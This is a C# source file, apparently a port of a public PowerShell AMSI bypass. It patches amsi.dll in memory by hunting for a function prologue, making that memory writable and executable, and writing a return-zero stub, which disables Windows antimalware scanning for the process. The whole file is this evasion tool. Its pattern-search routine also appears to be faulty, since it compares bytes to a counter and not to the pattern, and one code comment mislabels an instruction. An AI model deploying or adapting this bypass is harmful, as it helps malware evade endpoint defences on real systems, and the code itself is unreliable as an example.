// csharp implementation of https://github.com/kmkz/PowerShell/blob/master/amsi-bypass.ps1
// I am not entirely sure why I went to the effort of converting this but here we are

using System;
using System.Runtime.InteropServices;
public class a
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out IntPtr lpflOldProtect);


    public static int Main()
    {
        IntPtr hModule = LoadLibrary("amsi.dll");
        IntPtr dllCanUnloadNowAddress = GetProcAddress(hModule, "DllCanUnloadNow");
        IntPtr OldProtection = Marshal.AllocHGlobal(4);
        byte[] egg = { };
        if (IntPtr.Size == 4)
        {

            Console.Write("[*] process running in 32bit");
            egg = new byte[] {
                0x8B, 0xFF,             // mov     edi,edi
                0x55,                   // push    ebp
                0x8B, 0xEC,             // mov     ebp,esp
                0x83, 0xEC, 0x18,       // sub     esp,18h
                0x53,                   // push    ebx
                0x56                    // push    esi
         };
        }
        else if (IntPtr.Size == 8)
        {
            Console.Write("[*] process running in 64bit");
            egg = new byte[] { 0x4C, 0x8B, 0xDC, 0x49, 0x89, 0x5B, 0x08, 0x49, 0x89, 0x6B, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x70 };
        }

        Console.Write(egg);
        IntPtr targetedAddress = FindAddress(dllCanUnloadNowAddress, egg);
        VirtualProtect(targetedAddress, 0x0015, 0x40, out OldProtection);
        byte[] patch = {
            0x31, 0xC0,    // xor rax, rax
            0xC3          // ret
            };
        Marshal.Copy(patch, 0, targetedAddress, patch.Length);

        return 0;
        static IntPtr FindAddress(IntPtr address, byte[] egg)
        {
            while (true)
            {
                int count = 0;

                while (true)
                {
                    address = IntPtr.Add(address, 1);
                    if (Marshal.ReadByte(address) == count)
                    {
                        count++;
                        if (count == egg.Length)
                        {
                            return IntPtr.Subtract(address, egg.Length - 1);
                        }
                    }
                    else
                    {
                        break;
                    }
                }
                return address;
            }
        }
        
        }
    }
